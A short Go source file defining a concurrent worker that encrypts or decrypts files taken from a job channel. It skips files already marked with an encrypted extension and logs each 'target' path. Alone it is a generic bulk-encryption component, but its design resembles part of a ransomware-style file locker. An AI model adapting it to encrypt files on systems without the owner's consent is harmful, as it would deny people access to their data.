package main

import (
	"log"
	"strings"
	"sync"
)

func (c *Cryptor) NewWorker(wg *sync.WaitGroup) {
	defer wg.Done()
	for path := range c.JobChan {
		var (
			status      = "success"
			suffixCheck = strings.HasSuffix(path, EncryptedExtension)
		)

		switch c.EncryptingOrDecrypting {
		case Encrypting:
			if suffixCheck {
				log.Printf("target: %s, already encrypted\n", path)
				continue
			}

			if err := c.CryptFunc(path, c.Encrypt); err != nil {
				status = err.Error()
			}

			log.Printf("target: %s, status: %v\n", path, status)

		case Decrypting:
			if !suffixCheck {
				log.Printf("target: %s, not encrypted\n", path)
				continue
			}

			if err := c.CryptFunc(path, c.Decrypt); err != nil {
				status = err.Error()
			}

			log.Printf("target: %s, status: %v\n", path, status)

		default:
			log.Printf("you added a new CryptorState")
		}
	}
}
